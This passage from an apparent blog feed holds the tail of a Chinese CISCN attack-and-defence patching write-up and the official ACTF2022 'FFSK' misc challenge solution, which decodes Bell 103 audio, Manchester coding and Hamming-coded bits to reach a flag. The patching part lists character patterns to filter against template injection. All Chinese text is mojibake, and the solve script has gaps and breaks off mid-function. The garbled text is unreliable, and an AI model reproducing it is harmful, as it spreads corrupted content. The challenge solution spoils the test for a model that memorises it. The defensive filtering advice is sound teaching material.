è„‘è¿‡æ»¤å¯ä»¥è¿…é€Ÿæ‰“ä¸ŠPatchï¼æˆ‘ä»¬å¯ä»¥å°½é‡æ„é€ ä¸€äº›æ­£å¸¸æµé‡ä¸­ä¸å¤ªå¯èƒ½å‡ºç°çš„å­—ç¬¦ç»„åˆæ¥é¿å…è¢«åˆ¤æœåŠ¡downæ‰ã€‚<br>æ¯”å¦‚è¯´ï¼Œæƒ³è¦è¿‡æ»¤Pythonæ¨¡æ¿æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥è¿‡æ»¤å¦‚ä¸‹ç»„åˆï¼š<br><code>|_</code>, <code>._</code>, <code>_c</code>, <code>_[</code>, <code>](</code><br>è€Œå¯¹äºSQLæ³¨å…¥å°±æ›´ç®€å•äº†ï¼šè‡ªå·±æ‰“ä¸€æ‰“ï¼Œçœ‹çœ‹å“ªäº›å‡½æ•°ã€ç¬¦å·èƒ½åˆ©ç”¨ï¼Œå°±ç›´æ¥è¿‡æ»¤æ‰ã€‚  </p>\n<h4 id=\"ç±»å‹å®‰å…¨\"><a href=\"#ç±»å‹å®‰å…¨\" class=\"headerlink\" title=\"ç±»å‹å®‰å…¨\"></a>ç±»å‹å®‰å…¨</h4><p>å¦‚æœæ¶‰åŠå¼±ç±»å‹çš„è¯­è¨€ï¼Œæ¯”å¦‚PHPï¼Œç»å¸¸ä¼šæœ‰æ´å‡ºåœ¨å¼±æ¯”è¾ƒä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å¦‚ä¸‹å‡ ç§æ‰‹æ®µï¼š  </p>\n<ul>\n<li>ä½¿ç”¨å¼ºæ¯”è¾ƒï¼šä¾‹å¦‚PHP&#x2F;Jsä¸­ä½¿ç”¨<code>===</code>è€Œé<code>==</code>ï¼›</li>\n<li>åœ¨å…³é”®å‚æ•°å…¥å£å¤„è¿›è¡Œæ­£åˆ™åŒ–ï¼šä¾‹å¦‚ï¼Œå¯¹äºæœŸæœ›æ˜¯æ•´æ•°çš„å‚æ•°<code>iv</code>ï¼Œå°±åº”å¼ºåˆ¶è®©<code>iv=intval(iv)</code>è½¬ä¸ºæ•´å‹ï¼›</li>\n</ul>\n<p>ç›¸ä¿¡ä¹Ÿå¯ä»¥å‘ç°å›½èµ›è¿™ç§patchéš¾åº¦è¿œä½äºattackçš„éš¾åº¦ã€‚å»ºè®®<strong>åšé¢˜çš„åˆæœŸå½“ä½œæ²¡æœ‰æ”»å‡»å¾—åˆ†ï¼Œå…ˆpatchäº†å†è¯´</strong>ã€‚</p>\n",
            "tags": [
                "Write-Up",
                "CISCN",
                "web"
            ]
        },
        {
            "id": "http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/",
            "url": "http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/",
            "title": "ACTF2022 - FFSK - Official WriteUp",
            "date_published": "2022-07-03T15:43:00.000Z",
            "content_html": "<p><del>ä¼—æ‰€å‘¨çŸ¥æ­ªæ­ªæ­ªè‹±æ–‡å¾ˆçƒ‚æ±‚è½»å–·</del>  </p>\n<h2 id=\"0-Intro\"><a href=\"#0-Intro\" class=\"headerlink\" title=\"0. Intro\"></a>0. Intro</h2><p>In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. Iâ€™m happy about their praise, but after checking their solution I think what truly â€œimpressiveâ€ is their creativity and persistence.</p>\n<p><strong>Strongly recommend reading their awesome solution: <a href=\"https://maplebacon.org/2022/06/actf-ffsk/\">https://maplebacon.org/2022/06/actf-ffsk/</a></strong></p>\n<p>FSK &#x3D; Frequency-shift keying.</p>\n<p>FFSK &#x3D; Double FSK or Fast FSK, whatever.</p>\n<p>This problem is designed to invite participants to have a look at <em>the principle of communication</em>.</p>\n<h2 id=\"1-Description\"><a href=\"#1-Description\" class=\"headerlink\" title=\"1. Description\"></a>1. Description</h2><p>A journey to solve a misc problem always begins from a problem description. Hereâ€™s it:</p>\n<blockquote>\n<p>Iâ€™ve bought the <strong>second commercialÂ modem</strong>Â forÂ computers in a big city of the UK.</p>\n<blockquote>\n<p>æ¿€æƒ…æ¾æ¹ƒçš„çƒè¿·è¿·æ‹è¿™ä¸ªåœ°æ–¹ã€‚é‡ä¸Šçƒèµ›å­£ï¼Œé…’å§é‡Œçš„çƒ­æƒ…ã€å‘å–Šã€å•¤é…’ã€æ‘‡æ»šï¼Œè¶³çƒè®©è¿™ä¸ªåŸå¸‚å……æ»¡æ´»åŠ›å’Œå¸Œæœ›ã€‚<br>ä»ä¸‰ä¸‡è‹±å°ºçš„äº‘ç«¯æœ›å»ï¼Œå¾€æ—¥çš„ç”Ÿæ´»æˆäº†ä¸€ä¸ªé¥è¿œå¾®å°çš„åœ°å›¾ã€‚<br>é˜³å…‰æ˜åªšçš„æ—¥å­ï¼Œå¼€å§‹å‡ºå‘ï¼ŒåŒ—äº¬æ—¶é—´00:50 å¼€å§‹èµ·é£ï¼Œä¸€ä¸ªæ¢¦çš„è·ç¦»ï¼Œå°±å¯ä»¥åˆ°è¾¾è·å…°é˜¿å§†æ–¯ç‰¹ä¸¹ï¼ŒçŸ­æš‚åœç•™ä¹‹åï¼Œç„¶åè½¬æœºé£å¾€è‹±å›½<br>å—èˆªçš„é£æœºé…ç½®å®Œå¤‡ï¼Œå…¨ç¨‹å¯ä»¥å……ç”µï¼Œè¿˜æœ‰wifiï¼Œå½±è§†å±æœ‰é¢å‰æœ€æ–°çš„ç”µå½±ã€‚ç¡ç¡é†’é†’ï¼Œåœ¨é£æœºä¸Šè§…åˆ°ä¸€éƒ¨ã€ŠåŒ—äº¬çˆ±æƒ…æ•…äº‹ã€‹ï¼Œè®©æˆ‘åœ¨ä¸‰ä¸‡è‹±å°ºçš„ç©ºä¸­å“­çš„ç¨€é‡Œå“—å•¦ã€‚</p>\n</blockquote>\n</blockquote>\n<p>Just Google it, and youâ€™ll realize what it means:</p>\n<ul>\n<li><p><strong>second commercialÂ modemâ†’Bell 103, corresponds with the file name â€œmodem.wavâ€</strong></p>\n</li>\n<li><p>a big city in the UK: <strong>Manchester</strong>, which refers to the famous coding method.</p>\n</li>\n<li><p>The source of the long Chinese paragraph: <a href=\"https://kknews.cc/zh-hk/travel/e6yjp34.html\">https://kknews.cc/zh-hk/travel/e6yjp34.html</a></p>\n<p>  It describes a trip to Manchester, which is indeed a big city in the UK.</p>\n</li>\n</ul>\n<h2 id=\"2-Bell-103\"><a href=\"#2-Bell-103\" class=\"headerlink\" title=\"2. Bell 103\"></a>2. Bell 103</h2><p>Hereâ€™s an article that shows how the Bell 103 protocol works: <a href=\"https://vigrey.com/blog/emulating-bell-103-modem\">https://vigrey.com/blog/emulating-bell-103-modem</a></p>\n<p>So two key points need your attention. First, characters are stored in ASCII code and are <strong>little-endian;</strong> second, it has 2 channels for communication: one for the server-side(2025&#x2F;2225 Hz), and another for the client-side(1070&#x2F;1270 Hz).</p>\n<p>You can also find it from the spectrogram of the .wav file.</p>\n<h2 id=\"3-Server-channel\"><a href=\"#3-Server-channel\" class=\"headerlink\" title=\"3. Server channel\"></a>3. Server channel</h2><p>Using the <code>minimodem</code>tool (See MapleBaconâ€™s write-up) is functional.</p>\n<p>Also, you can find some useful tools in GitHub: <a href=\"https://github.com/laurenschneider/audiodecoder\">https://github.com/laurenschneider/audiodecoder</a></p>\n<p>It may be a faster way. In fact, the <code>solve.py</code> is based on its code.</p>\n<p>After all, youâ€™ll see this on the server channel:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such</span><br><span class=\"line\">a slow method with a high Bit Error Ratio for communication? It took me a lot of</span><br><span class=\"line\">effort to correct bit-flips, making sure the communication was less</span><br><span class=\"line\">error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER</span><br><span class=\"line\">TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel</span><br><span class=\"line\">while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is</span><br><span class=\"line\">the new protocol? Guess by yourself!</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-Client-channel\"><a href=\"#4-Client-channel\" class=\"headerlink\" title=\"4. Client channel\"></a>4. Client channel</h2><p>We can extract the bit string on this channel using the same method but just make some tweaks of frequency. Youâ€™ll get a bit string of 53640 bits.</p>\n<p>Notice that the bit string contains only â€œ01â€ â€œ10â€, that is what <strong>Manchester is</strong> all about. The <code>IEEE 802.3</code>mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&#x2F;10 to 1&#x2F;0, but what is widely used is defined in IEEE 802.3, which says â€œ01â€â†’1 and â€œ10â€â†’0</p>\n<p>Then the key problem is to solve Hamming code. From the given information, youâ€™ll realize the block size is 20bits. Implement it by yourself or just Google&#x2F;GitHub&#x2F;StackOverflow it.</p>\n<p>Find every â€œ1â€ bit in a block, XOR their <strong>positions</strong>, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit.</p>\n<p>Actually, every block has, and only has an error bit: thatâ€™s an intended design to notify you that youâ€™re on the right way :)</p>\n<h2 id=\"5-Final-Step\"><a href=\"#5-Final-Step\" class=\"headerlink\" title=\"5. Final Step\"></a>5. Final Step</h2><p>Now youâ€™ve got the cipher bit string: just applied Bell 103 decoder to it once again.</p>\n<p>Itâ€™ll yield a string that starts with <code>data:image/png;base64,</code></p>\n<p>An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. Itâ€™s a QR Code. Scan it, and got the flag.</p>\n<h2 id=\"6-Hints-Explanation\"><a href=\"#6-Hints-Explanation\" class=\"headerlink\" title=\"6. Hints Explanation\"></a>6. Hints Explanation</h2><ol>\n<li><p><code>æ‰€æœ‰äººéƒ½è®¤ä¸ºï¼Œåƒé¸¡è›‹å‰ï¼ŒåŸå§‹çš„æ–¹æ³•æ˜¯æ‰“ç ´é¸¡è›‹è¾ƒå¤§çš„ä¸€ç«¯ã€‚å¯æ˜¯å½“ä»Šçš‡å¸çš„ç¥–çˆ¶ æ—¶å€™åƒé¸¡è›‹ï¼Œä¸€æ¬¡æŒ‰å¤æ³•æ‰“é¸¡è›‹æ—¶ç¢°å·§å°†ä¸€ä¸ªæ‰‹æŒ‡å¼„ç ´äº†ï¼Œå› æ­¤ä»–çš„çˆ¶äº²ï¼Œå½“æ—¶çš„çš‡å¸ï¼Œ å°±ä¸‹äº†ä¸€é“æ••ä»¤ï¼Œå‘½ä»¤å…¨ä½“è‡£æ°‘åƒé¸¡è›‹æ—¶æ‰“ç ´é¸¡è›‹è¾ƒå°çš„ä¸€ç«¯ï¼Œè¿ä»¤è€…é‡ç½šã€‚ è€ç™¾å§“ä»¬ å¯¹è¿™é¡¹å‘½ä»¤æä¸ºåæ„Ÿã€‚å†å²å‘Šè¯‰æˆ‘ä»¬ï¼Œç”±æ­¤æ›¾å‘ç”Ÿè¿‡å…­æ¬¡å›ä¹±ï¼Œå…¶ä¸­ä¸€ä¸ªçš‡å¸é€äº†å‘½ï¼Œå¦ ä¸€ä¸ªä¸¢äº†ç‹ä½â€¦å…³äºè¿™ä¸€äº‰ç«¯ï¼Œæ›¾å‡ºç‰ˆè¿‡å‡ ç™¾æœ¬å¤§éƒ¨è‘—ä½œï¼Œä¸è¿‡å¤§ç«¯æ´¾çš„ä¹¦ä¸€ç›´æ˜¯å—ç¦çš„ ï¼Œæ³•å¾‹ä¹Ÿè§„å®šè¯¥æ´¾çš„ä»»ä½•äººä¸å¾—åšå®˜ã€‚ â€”â€”ä¹”çº³æ£®Â·æ–¯å¨å¤«ç‰¹ï¼Œã€Šæ ¼åˆ—ä½›æ¸¸è®°ã€‹</code></p>\n<p> It is a quote from Gulliverâ€™s Travels.  Fun fact: this paragraph is <strong>exactly the original source of the 2 words used in modern computer science: â€œbig-endianâ€ &amp; â€œlittle-endianâ€.</strong></p>\n<p> This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.</p>\n</li>\n<li><p><code>Hamming code block size: 20bits</code></p>\n<p> Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.</p>\n</li>\n<li><p><code>Bell 103</code></p>\n<p> For those who ignored the problem description.</p>\n</li>\n</ol>\n<h2 id=\"6-Script-to-Solve\"><a href=\"#6-Script-to-Solve\" class=\"headerlink\" title=\"6. Script to Solve\"></a>6. Script to Solve</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># goertzel.py</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">Module to create a Goertzel filter</span></span><br><span class=\"line\"><span class=\"string\">Original source: https://github.com/laurenschneider/audiodecoder</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Goertzel</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, rate, freq</span>):</span><br><span class=\"line\">        self.normalize = <span class=\"number\">0</span></span><br><span class=\"line\">        self.coeffs = <span class=\"number\">0</span></span><br><span class=\"line\">        self.sample_rate = rate</span><br><span class=\"line\">        self.target_freq = freq</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">calculate_coeff</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        Precompute coefficients needed for filter equation.</span></span><br><span class=\"line\"><span class=\"string\">        Coeff formulas courtesy of Prof. Massey</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        n = <span class=\"number\">160</span></span><br><span class=\"line\"></span><br><span class=\"line\">        w0 = (<span class=\"number\">2</span> * np.pi * self.target_freq) / self.sample_rate</span><br><span class=\"line\">        self.normalize = np.exp(<span class=\"number\">1j</span> * w0 * n)</span><br><span class=\"line\">        self.coeffs = np.array([np.exp((-<span class=\"number\">1j</span>) * w0 * k) <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">filter</span>(<span class=\"params\">self, samples</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        Goertzel filter equation</span></span><br><span class=\"line\"><span class=\"string\">        :param samples: array of samples</span></span><br><span class=\"line\"><span class=\"string\">        :returns: amplitude</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        y = self.normalize * <span class=\"number\">160</span> * np.dot(self.coeffs, samples)</span><br><span class=\"line\">        ampl = np.<span class=\"built_in\">abs</span>(y)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ampl</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># decode.py</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">Decode a wav file using a Goertzel filter.</span></span><br><span class=\"line\"><span class=\"string\">Modified from https://github.com/laurenschneider/audiodecoder</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> goertzel <span class=\"keyword\">import</span> Goertzel</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> scipy.io <span class=\"keyword\">import</span> wavfile</span><br><span class=\"line\"></span><br><span class=\"line\">DATA = os.path.dirname(os.path.abspath(__file__))</span><br><span class=\"line\">filepath = os.path.join(DATA, <span class=\"string\">&quot;filename.wav&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Read sample rate and data from audio file</span></span><br><span class=\"line\">rate, data = wavfile.read(filepath)</span><br><span class=\"line\"></span><br><span class=\"line\">message = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">bit_string = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">mark_freq = <span class=\"number\">2225</span></span><br><span class=\"line\">space_freq = <span class=\"number\">2025</span></span><br><span class=\"line\">mark_filter = Goertzel(rate, mark_freq)</span><br><span class=\"line\">space_filter = Goertzel(rate, space_freq)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># calculate coefficients for each filter</span></span><br><span class=\"line\">mark_filter.calculate_coeff()</span><br><span class=\"line\">space_filter.calculate_coeff()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(data.size + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># for each chunk of 160 samples</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i%<span class=\"number\">160</span> == <span class=\"number\">0</span> <span class=\"keyword\">and</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = i - <span class=\"number\">160</span></span><br><span class=\"line\">        end = i</span><br><span class=\"line\">        samples = data[start:end]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># get amplitutes of sample set</span></span><br><span class=\"line\">        mark_amp = mark_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\">        space_amp = space_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mark_amp &gt; space_amp:</span><br><span class=\"line\">            <span class=\"comment\"># bit is 1</span></span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># bit is zero</span></span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        bit_string = to_add + bit_string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>, <span class=\"built_in\">len</span>(bit_string)+<span class=\"number\">10</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x%<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = x - <span class=\"number\">9</span></span><br><span class=\"line\">        end = x - <span class=\"number\">1</span></span><br><span class=\"line\">        message = <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bit_string[start:end],<span class=\"number\">2</span>)) + message</span><br><span class=\"line\"><span class=\"built_in\">print</span>(message)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># set target frequencies</span></span><br><span class=\"line\">mark_freq = <span class=\"number\">1270</span></span><br><span class=\"line\">space_freq = <span class=\"number\">1070</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># create two filters</span></span><br><span class=\"line\">mark_filter = Goertzel(rate, mark_freq)</span><br><span class=\"line\">space_filter = Goertzel(rate, space_freq)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># calculate coefficients for each filter</span></span><br><span class=\"line\">mark_filter.calculate_coeff()</span><br><span class=\"line\">space_filter.calculate_coeff()</span><br><span class=\"line\"></span><br><span class=\"line\">bit_string = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">message = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(data.size + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># for each chunk of 160 samples</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i%<span class=\"number\">160</span> == <span class=\"number\">0</span> <span class=\"keyword\">and</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = i - <span class=\"number\">160</span></span><br><span class=\"line\">        end = i</span><br><span class=\"line\">        samples = data[start:end]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># get amplitutes of sample set</span></span><br><span class=\"line\">        mark_amp = mark_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\">        space_amp = space_filter.<span class=\"built_in\">filter</span>(samples)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mark_amp &gt; space_amp:</span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            to_add = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        bit_string = to_add + bit_string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingBolck</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span>(<span class=\"built_in\">len</span>(message)==<span class=\"number\">15</span>)</span><br><span class=\"line\">    message=message[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">    code = <span class=\"number\">0</span></span><br><span class=\"line\">    m_pos = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ind+<span class=\"number\">1</span>)&amp;(ind): <span class=\"comment\"># Not parity check bit</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(message[m_pos],<span class=\"number\">2</span>):</span><br><span class=\"line\">                code = code ^ (<span class=\"number\">1</span>&lt;&lt;ind)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b1</span>)&lt;&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b10</span>)&lt;&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b100</span>)&lt;&lt;<span class=\"number\">1</span>)</span><br><span class=\"line\">                code = code ^ (((ind+<span class=\"number\">1</span>)&amp;<span class=\"number\">0b1000</span>)&lt;&lt;<span class=\"number\">4</span>)</span><br><span class=\"line\">            m_pos = m_pos + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    code = code ^ (<span class=\"number\">1</span>&lt;&lt;random.randint(<span class=\"number\">0</span>,<span class=\"number\">19</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&#123;0:020b&#125;&quot;</span>.<span class=\"built_in\">format</span>(code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;from &quot;</span>+message+<span class=\"string\">&quot; to &quot;</span>+retStr)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingBolckInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span>(<span class=\"built_in\">len</span>(message)==<span class=\"number\">20</span>)</span><br><span class=\"line\">    code = <span class=\"built_in\">int</span>(message,<span class=\"number\">2</span>)</span><br><span class=\"line\">    wrong = <span 